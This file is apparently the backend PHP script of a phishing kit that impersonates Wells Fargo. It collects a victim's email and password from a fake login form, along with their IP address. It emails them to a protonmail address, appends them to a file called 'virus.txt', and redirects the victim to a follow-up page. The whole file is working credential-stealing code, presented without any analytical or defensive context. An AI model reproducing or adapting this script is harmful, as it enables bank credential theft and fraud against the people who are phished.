<?php
$ip = getenv("REMOTE_ADDR");
$message .= "--------------WesFago-----------\n";
$message .= "EMAIL : ".$_POST['jinga']."\n";
$message .= "EPASS : ".$_POST['awko2']."\n";
$message .= "IP    : ".$ip."\n";
$message .= "-----------NextLevel-------------\n";

$send = "100fareedah@protonmail.com";
$subject = " WelsFargo ||".$ip."\n";
$headers = "From: WFargo  <codewizard@approject.com>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
$arr=array($send, $IP);
foreach ($arr as $send)
{
mail($send,$subject,$message,$headers);
mail($to,$subject,$message,$headers);
}
$fp = fopen("virus.txt","a");
fputs($fp,$message);
fclose($fp);
		header("Location: last.html?section=signinpage&update=&cookiecheck=yes&desta/signin&accoening/ApplicationStartup/Application$update=&cookiecheck=yes&desge&update=");

	 
?>